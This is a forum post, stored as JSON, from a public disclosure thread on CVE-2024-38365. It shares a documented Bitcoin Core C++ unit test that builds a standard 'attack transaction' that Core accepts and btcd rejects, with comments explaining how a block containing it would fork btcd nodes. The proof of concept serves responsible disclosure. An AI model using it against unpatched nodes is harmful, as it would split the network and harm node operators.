{
  "id": 5796,
  "name": "Antoine Poinsot",
  "username": "AntoineP",
  "avatar_template": "/user_avatar/delvingbitcoin.org/antoinep/{size}/483_2.png",
  "created_at": "2025-09-03T13:13:32.518Z",
  "cooked": "<aside class=\"quote no-group\" data-username=\"AntoineP\" data-post=\"11\" data-topic=\"1184\">\n<div class=\"title\">\n<div class=\"quote-controls\"></div>\n<img alt=\"\" width=\"24\" height=\"24\" src=\"https://delvingbitcoin.org/user_avatar/delvingbitcoin.org/antoinep/48/483_2.png\" class=\"avatar\"> AntoineP:</div>\n<blockquote>\n<p>It\u2019s been 5 months in a couple days so i\u2019m planning to share this soon for documentation purpose.</p>\n</blockquote>\n</aside>\n<p>Finally getting back to this another 5 months later. Here is the documented Bitcoin Core unit test that was sent as part of the report. It can be ran against Core <code>v27.0</code> and generates a transaction that would be valid according to Bitcoin Core but not according to Btcd.</p>\n<pre data-code-wrap=\"cpp\"><code class=\"lang-cpp\">// Copyright (c) 2024 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include &lt;boost/test/unit_test.hpp&gt;\n\n#include &lt;chainparams.h&gt;\n#include &lt;core_io.h&gt;\n#include &lt;script/interpreter.h&gt;\n#include &lt;secp256k1.h&gt;\n#include &lt;secp256k1_recovery.h&gt;\n#include &lt;test/util/setup_common.h&gt;\n#include &lt;util/strencodings.h&gt;\n#include &lt;validation.h&gt;\n\nBOOST_AUTO_TEST_SUITE(btcd_fad)\n\n/**\n * Demonstration of a consensus bug in btcd, a Go reimplementation of Bitcoin.\n *\n * This is joint work with Niklas G\u00f6gge.\n *\n * The purpose of this test is to demonstrate that the implementation of\n * FindAndDelete in btcd (removeOpcodeData) differs from Bitcoin Core. One\n * difference is how btcd will drop any data push from the scriptCode that\n * contains the signature being validated, whereas Core will only drop data\n * pushes that are exact matches. This is the bug chosen for this demonstration\n * (there may be others).\n *\n * To produce a consensus split, we need a signature that would be accepted by\n * Bitcoin Core but not by btcd (or vice-versa). This test demostrates how to\n * construct a set of standard transactions containing such a signature.\n *\n * First we create a preparation transaction that creates a P2SH output with\n * the following redeemScript: `OP_CHECKSIGVERIFY &lt;x||dummy_sig&gt;` (the exact\n * value for \"x\" is irrelevant). \"dummy_sig\" is a signature that was randomly\n * generated (the exact signature used is also irrelevant as long as it is\n * properly encoded).\n *\n * Second we create an attack transaction that spends the preparation\n * scriptPubKey. It's scriptSig is the following:\n * `&lt;dummy_sig&gt; &lt;pubkey&gt; &lt;redeemScript&gt;`. We derive the pubkey from \"dummy_sig\"\n * and the signature hash (redeemScript is used as the scriptCode for the\n * sighash).\n *\n * The crux here is that btcd will drop the `&lt;x||dummy_sig&gt;` data push when\n * evaluating the redeemScript while Bitcoin Core will not. btcd arrives at a\n * different signature hash which makes the signature check fail. A block\n * containing the attack transaction would fork btcd nodes from the network.\n */\nBOOST_FIXTURE_TEST_CASE(btcd_fad, BasicTestingSetup)\n{\n    // We always create 0-value outputs.\n    const CAmount txouts_value{0};\n\n    // Create a small DER-encoded dummy sig. We later use it in combination with\n    // the sighash to derive a matching pubkey.\n    const auto dummy_sig{ParseHex(\"300602010102010101\")};\n    // As previously mentioned btcd will drop partial matches from the scriptCode,\n    // so we create a piece of data that contains the dummy sig.\n    const auto dummy_sig_pushed{ParseHex(\"09300602010102010101\")};\n\n    // Create the preparation transaction, which pays to a P2SH scriptPubKey.\n    // The redeemScript is a simple OP_CHECKSIGVERIFY followed by the data that\n    // contains the dummy sig.\n    const auto redeem_script{CScript() &lt;&lt; OP_CHECKSIGVERIFY &lt;&lt; dummy_sig_pushed};\n    const auto prep_spk{CScript() &lt;&lt; OP_HASH160 &lt;&lt; ToByteVector(Hash160(redeem_script)) &lt;&lt; OP_EQUAL};\n    CMutableTransaction prep_tx;\n    prep_tx.vout.emplace_back(CTxOut{0, prep_spk});\n    prep_tx.vin.emplace_back(CTxIn{{Txid{}, 0}});\n\n    // Create the transaction that would trigger the hard fork by spending from\n    // the preparation tx. We use a placeholder for the scriptSig which we'll\n    // later replace with the dummy sig, pubkey and redeemScript, but first we\n    // need to actually recover the public key.\n    CMutableTransaction attack_tx;\n    attack_tx.vout.emplace_back(CTxOut{0, CScript() &lt;&lt; OP_TRUE});\n    attack_tx.vin.emplace_back(CTxIn{COutPoint{prep_tx.GetHash(), 0}, /*scriptSigIn=*/CScript() &lt;&lt; OP_TRUE});\n\n    // First step toward recovering the public key: compute the sighash using\n    // the redeemScript.\n    //\n    // Note: this is where things go wrong for btcd because it will drop the\n    // data push (dummy_sig_pushed) that contains the sig from the script code\n    // and therefore arive at a different sighash.\n    const auto sighash{SignatureHash(redeem_script, attack_tx, 0, SIGHASH_ALL, 0, SigVersion::BASE)};\n\n    // Now dance around the secp256k1 types and formats to recover a public key\n    // valid for this signature and sighash.\n    std::vector&lt;unsigned char&gt; pubkey(33);\n    secp256k1_pubkey secp_pubkey;\n    std::vector&lt;unsigned char&gt; compact_dummy_sig(64);\n    secp256k1_ecdsa_recoverable_signature recoverable_dummy_sig;\n    secp256k1_ecdsa_signature secp_dummy_sig;\n    secp256k1_context* secp_ctx = Assert(secp256k1_context_create(SECP256K1_CONTEXT_NONE));\n    assert(secp256k1_ecdsa_signature_parse_der(secp_ctx, &amp;secp_dummy_sig, dummy_sig.data(), dummy_sig.size() - 1) == 1);\n    assert(secp256k1_ecdsa_signature_serialize_compact(secp_ctx, compact_dummy_sig.data(), &amp;secp_dummy_sig) == 1);\n    assert(secp256k1_ecdsa_recoverable_signature_parse_compact(secp_ctx, &amp;recoverable_dummy_sig, compact_dummy_sig.data(), 0) == 1);\n    assert(secp256k1_ecdsa_recover(secp_ctx, &amp;secp_pubkey, &amp;recoverable_dummy_sig, sighash.data()) == 1);\n    size_t _unused_pk_size{33};\n    assert(secp256k1_ec_pubkey_serialize(secp_ctx, pubkey.data(), &amp;_unused_pk_size, &amp;secp_pubkey, SECP256K1_EC_COMPRESSED) == 1);\n    secp256k1_context_destroy(secp_ctx);\n\n    // We got a valid pubkey. Push the sig and the pubkey onto the scriptSig of\n    // the attack transaction to satisfy the CHECKSIGVERIFY in the redeemScript.\n    CScript script_sig;\n    script_sig &lt;&lt; dummy_sig\n               &lt;&lt; pubkey\n               &lt;&lt; std::vector&lt;unsigned char&gt;{redeem_script.begin(), redeem_script.end()};\n    attack_tx.vin[0].scriptSig = script_sig;\n\n    // The scriptSig of the attack tx must verify against the scriptPubKey of\n    // the preparation tx.\n    //\n    // Note: This attack does not require non-standard transactions.\n    unsigned int flags{STANDARD_SCRIPT_VERIFY_FLAGS};\n    assert(VerifyScript(script_sig, prep_spk, nullptr, flags, MutableTransactionSignatureChecker(&amp;attack_tx, 0, txouts_value, MissingDataBehavior::ASSERT_FAIL)));\n}\n\nBOOST_AUTO_TEST_SUITE_END()\n</code></pre>",
  "post_number": 12,
  "post_type": 1,
  "posts_count": 12,
  "updated_at": "2025-09-03T13:13:32.518Z",
  "reply_count": 0,
  "reply_to_post_number": null,
  "quote_count": 1,
  "incoming_link_count": 0,
  "reads": 26,
  "readers_count": 25,
  "score": 5.2,
  "yours": false,
  "topic_id": 1184,
  "topic_slug": "cve-2024-38365-public-disclosure-btcd-findanddelete-bug",
  "topic_title": "CVE-2024-38365 public disclosure (btcd `FindAndDelete` bug)",
  "topic_html_title": "CVE-2024-38365 public disclosure (btcd `FindAndDelete` bug)",
  "category_id": 8,
  "display_username": "Antoine Poinsot",
  "primary_group_name": null,
  "flair_name": "wg-consensus-cleanup",
  "flair_url": "/uploads/default/original/1X/856d779f9ec58484f3a96285a21a813538b689f6.png",
  "flair_bg_color": "",
  "flair_color": "",
  "flair_group_id": 43,
  "badges_granted": [],
  "version": 1,
  "can_edit": false,
  "can_delete": false,
  "can_recover": false,
  "can_see_hidden_post": false,
  "can_wiki": false,
  "user_title": "Regular",
  "title_is_group": false,
  "bookmarked": false,
  "raw": "[quote=\"AntoineP, post:11, topic:1184\"]\nIt\u2019s been 5 months in a couple days so i\u2019m planning to share this soon for documentation purpose.\n\n[/quote]\n\nFinally getting back to this another 5 months later. Here is the documented Bitcoin Core unit test that was sent as part of the report. It can be ran against Core `v27.0` and generates a transaction that would be valid according to Bitcoin Core but not according to Btcd.\n\n```cpp\n// Copyright (c) 2024 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <boost/test/unit_test.hpp>\n\n#include <chainparams.h>\n#include <core_io.h>\n#include <script/interpreter.h>\n#include <secp256k1.h>\n#include <secp256k1_recovery.h>\n#include <test/util/setup_common.h>\n#include <util/strencodings.h>\n#include <validation.h>\n\nBOOST_AUTO_TEST_SUITE(btcd_fad)\n\n/**\n * Demonstration of a consensus bug in btcd, a Go reimplementation of Bitcoin.\n *\n * This is joint work with Niklas G\u00f6gge.\n *\n * The purpose of this test is to demonstrate that the implementation of\n * FindAndDelete in btcd (removeOpcodeData) differs from Bitcoin Core. One\n * difference is how btcd will drop any data push from the scriptCode that\n * contains the signature being validated, whereas Core will only drop data\n * pushes that are exact matches. This is the bug chosen for this demonstration\n * (there may be others).\n *\n * To produce a consensus split, we need a signature that would be accepted by\n * Bitcoin Core but not by btcd (or vice-versa). This test demostrates how to\n * construct a set of standard transactions containing such a signature.\n *\n * First we create a preparation transaction that creates a P2SH output with\n * the following redeemScript: `OP_CHECKSIGVERIFY <x||dummy_sig>` (the exact\n * value for \"x\" is irrelevant). \"dummy_sig\" is a signature that was randomly\n * generated (the exact signature used is also irrelevant as long as it is\n * properly encoded).\n *\n * Second we create an attack transaction that spends the preparation\n * scriptPubKey. It's scriptSig is the following:\n * `<dummy_sig> <pubkey> <redeemScript>`. We derive the pubkey from \"dummy_sig\"\n * and the signature hash (redeemScript is used as the scriptCode for the\n * sighash).\n *\n * The crux here is that btcd will drop the `<x||dummy_sig>` data push when\n * evaluating the redeemScript while Bitcoin Core will not. btcd arrives at a\n * different signature hash which makes the signature check fail. A block\n * containing the attack transaction would fork btcd nodes from the network.\n */\nBOOST_FIXTURE_TEST_CASE(btcd_fad, BasicTestingSetup)\n{\n    // We always create 0-value outputs.\n    const CAmount txouts_value{0};\n\n    // Create a small DER-encoded dummy sig. We later use it in combination with\n    // the sighash to derive a matching pubkey.\n    const auto dummy_sig{ParseHex(\"300602010102010101\")};\n    // As previously mentioned btcd will drop partial matches from the scriptCode,\n    // so we create a piece of data that contains the dummy sig.\n    const auto dummy_sig_pushed{ParseHex(\"09300602010102010101\")};\n\n    // Create the preparation transaction, which pays to a P2SH scriptPubKey.\n    // The redeemScript is a simple OP_CHECKSIGVERIFY followed by the data that\n    // contains the dummy sig.\n    const auto redeem_script{CScript() << OP_CHECKSIGVERIFY << dummy_sig_pushed};\n    const auto prep_spk{CScript() << OP_HASH160 << ToByteVector(Hash160(redeem_script)) << OP_EQUAL};\n    CMutableTransaction prep_tx;\n    prep_tx.vout.emplace_back(CTxOut{0, prep_spk});\n    prep_tx.vin.emplace_back(CTxIn{{Txid{}, 0}});\n\n    // Create the transaction that would trigger the hard fork by spending from\n    // the preparation tx. We use a placeholder for the scriptSig which we'll\n    // later replace with the dummy sig, pubkey and redeemScript, but first we\n    // need to actually recover the public key.\n    CMutableTransaction attack_tx;\n    attack_tx.vout.emplace_back(CTxOut{0, CScript() << OP_TRUE});\n    attack_tx.vin.emplace_back(CTxIn{COutPoint{prep_tx.GetHash(), 0}, /*scriptSigIn=*/CScript() << OP_TRUE});\n\n    // First step toward recovering the public key: compute the sighash using\n    // the redeemScript.\n    //\n    // Note: this is where things go wrong for btcd because it will drop the\n    // data push (dummy_sig_pushed) that contains the sig from the script code\n    // and therefore arive at a different sighash.\n    const auto sighash{SignatureHash(redeem_script, attack_tx, 0, SIGHASH_ALL, 0, SigVersion::BASE)};\n\n    // Now dance around the secp256k1 types and formats to recover a public key\n    // valid for this signature and sighash.\n    std::vector<unsigned char> pubkey(33);\n    secp256k1_pubkey secp_pubkey;\n    std::vector<unsigned char> compact_dummy_sig(64);\n    secp256k1_ecdsa_recoverable_signature recoverable_dummy_sig;\n    secp256k1_ecdsa_signature secp_dummy_sig;\n    secp256k1_context* secp_ctx = Assert(secp256k1_context_create(SECP256K1_CONTEXT_NONE));\n    assert(secp256k1_ecdsa_signature_parse_der(secp_ctx, &secp_dummy_sig, dummy_sig.data(), dummy_sig.size() - 1) == 1);\n    assert(secp256k1_ecdsa_signature_serialize_compact(secp_ctx, compact_dummy_sig.data(), &secp_dummy_sig) == 1);\n    assert(secp256k1_ecdsa_recoverable_signature_parse_compact(secp_ctx, &recoverable_dummy_sig, compact_dummy_sig.data(), 0) == 1);\n    assert(secp256k1_ecdsa_recover(secp_ctx, &secp_pubkey, &recoverable_dummy_sig, sighash.data()) == 1);\n    size_t _unused_pk_size{33};\n    assert(secp256k1_ec_pubkey_serialize(secp_ctx, pubkey.data(), &_unused_pk_size, &secp_pubkey, SECP256K1_EC_COMPRESSED) == 1);\n    secp256k1_context_destroy(secp_ctx);\n\n    // We got a valid pubkey. Push the sig and the pubkey onto the scriptSig of\n    // the attack transaction to satisfy the CHECKSIGVERIFY in the redeemScript.\n    CScript script_sig;\n    script_sig << dummy_sig\n               << pubkey\n               << std::vector<unsigned char>{redeem_script.begin(), redeem_script.end()};\n    attack_tx.vin[0].scriptSig = script_sig;\n\n    // The scriptSig of the attack tx must verify against the scriptPubKey of\n    // the preparation tx.\n    //\n    // Note: This attack does not require non-standard transactions.\n    unsigned int flags{STANDARD_SCRIPT_VERIFY_FLAGS};\n    assert(VerifyScript(script_sig, prep_spk, nullptr, flags, MutableTransactionSignatureChecker(&attack_tx, 0, txouts_value, MissingDataBehavior::ASSERT_FAIL)));\n}\n\nBOOST_AUTO_TEST_SUITE_END()\n```",
  "actions_summary": [],
  "moderator": false,
  "admin": false,
  "staff": false,
  "user_id": 12,
  "hidden": false,
  "trust_level": 3,
  "deleted_at": null,
  "user_deleted": false,
  "edit_reason": null,
  "can_view_edit_history": true,
  "wiki": false,
  "excerpt": "Finally getting back to this another 5 months later. Here is the documented Bitcoin Core unit test that was sent as part of the report. It can be ran against Core v27.0 and generates a transaction that would be valid according to Bitcoin Core but not according to Btcd. \n// Copyright (c) 2024 The Bi&hellip;",
  "truncated": true,
  "post_url": "/t/cve-2024-38365-public-disclosure-btcd-findanddelete-bug/1184/12",
  "reactions": [],
  "current_user_reaction": null,
  "reaction_users_count": 0,
  "current_user_used_main_reaction": false,
  "can_accept_answer": false,
  "can_unaccept_answer": false,
  "accepted_answer": false,
  "topic_accepted_answer": null
}